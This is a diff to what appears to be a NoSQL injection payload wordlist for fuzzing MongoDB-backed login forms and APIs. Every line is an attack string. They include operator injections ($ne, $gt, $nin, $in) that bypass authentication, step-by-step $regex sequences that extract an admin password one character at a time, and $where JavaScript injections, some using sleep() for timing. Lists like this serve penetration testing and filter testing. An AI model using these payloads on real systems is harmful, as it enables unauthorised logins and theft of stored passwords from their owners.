@@ -1,12 +1,112 @@
-login[$ne]=1&pass[$ne]=1
-?username[$gt]=&password[$gt]=
-{"password":{"$ne":""}}
-{"user":{"$regex":"^a"}}
-user[$where]=admin
 ' || '1'=='1
 '||1==1
-admin'; return this.a; var x='
-{$ne:1}
 ?search=$regex
+?username[$gt]=&password[$gt]=
+admin'; return this.a; var x='
 db.users.find({$where:"sleep(5000)"})
+login[$gt]=admin&login[$lt]=test&pass[$ne]=1
+login[$ne]=1&pass[$ne]=1
+login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
+login[$regex]=a.*&pass[$ne]=lol
 mark[$where]=function(){return true}
+user[$where]=admin
+username=admin&password[$gt]=
+username=admin&password[$gt]=aaaaa
+username=admin&password[$lt]=zzzzz
+username=admin&password[$ne]=password
+username=admin&password[$ne]=wrongpass
+username=admin&password[$nin][]=admin
+username=admin&password[$nin][]=password
+username=admin&password[$regex]=.*
+username=admin&password[$regex]=^a
+username=admin&password[$regex]=^ad
+username=admin&password[$regex]=^adm
+username=admin&password[$regex]=^admi
+username=admin&password[$regex]=^admin
+username[$gt]=&password[$gt]=
+username[$gt]=a&password[$gt]=a
+username[$ne]=admin&password[$ne]=admin&password[$ne]=password
+username[$ne]=toto&password[$ne]=toto
+username[$ne]=toto&password[$regex]=.{1}
+username[$ne]=toto&password[$regex]=.{3}
+username[$ne]=toto&password[$regex]=m.*
+username[$ne]=toto&password[$regex]=m.{2}
+username[$ne]=toto&password[$regex]=md.*
+username[$ne]=toto&password[$regex]=md.{1}
+username[$ne]=toto&password[$regex]=mdp
+username[$regex]=^ad&password[$ne]=wrong
+{"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}}
+{"$or": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]}
+{"$where": "this.username == 'admin' && this.password != ''"}
+{"id": "10", "id": "100"}
+{"password": {"$ne": ""}, "username": {"$ne": ""}}
+{"password": {"$ne": "123456"}}
+{"password": {"$ne": "admin"}}
+{"password": {"$ne": "password"}}
+{"password": {"$ne": "root"}}
+{"password": {"$regex": ".*"}}
+{"password": {"$regex": "^A"}}
+{"password": {"$regex": "^a"}}
+{"password": {"$regex": "^admin"}}
+{"password": {"$regex": "^admin.*$"}}
+{"password": {"$regex": "^root"}}
+{"password": {"$regex": "admin.*"}}
+{"password":{"$ne":""}}
+{"price": {"$gte": 0}}
+{"price": {"$in": [0, 10, 20]}}
+{"price": {"$lt": 100}}
+{"price": {"$lte": 100}}
+{"price": {"$ne": 0}}
+{"price": {"$nin": [0]}}
+{"user":{"$regex":"^a"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^b"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^c"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^d"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^e"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^f"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^g"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^h"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^i"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^j"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^k"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^l"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^m"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^md"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^n"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^o"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^p"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^q"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^r"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^s"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^t"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^u"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^v"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^w"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^x"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^y"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^z"}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$gt": ""}, "password": {"$lt": ""}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$in": ["Admin", "4dm1n", "admin", "root", "administrator"]}, "password": {"$gt": ""}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$ne": null}, "password": {"$gt": ""}}
+{"username": {"$ne": null}, "password": {"$in": []}}
+{"username": {"$ne": null}, "password": {"$lt": ""}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": null}, "password": {"$nin": []}}
+{"username": {"$nin": ["admin", "root"]}, "password": {"$gt": ""}}
+{"username": {"$nin": ["admin"]}, "password": {"$nin": ["password"]}}
+{"username": {"$regex": ".*"}}
+{"username": {"$regex": "^admin$"}}
+{"username": {"$regex": "a.*"}, "password": {"$ne": "x"}}
+{"username": {"$regex": "ad.*"}, "password": {"$ne": "x"}}
+{"username": {"$regex": "adm.*"}, "password": {"$ne": "x"}}
+{"username": {"$regex": "admin"}}
+{"username": {"$regex": "admin.*"}, "password": {"$ne": "x"}}
+{"username": {"$where": "1==1"}}
+{"username": {"$where": "sleep(1000)"}}
+{"username": {"$where": "this.password.length == 3"}}
+{"username": {"$where": "this.password.match(/^a/)"}}
+{$ne:1}
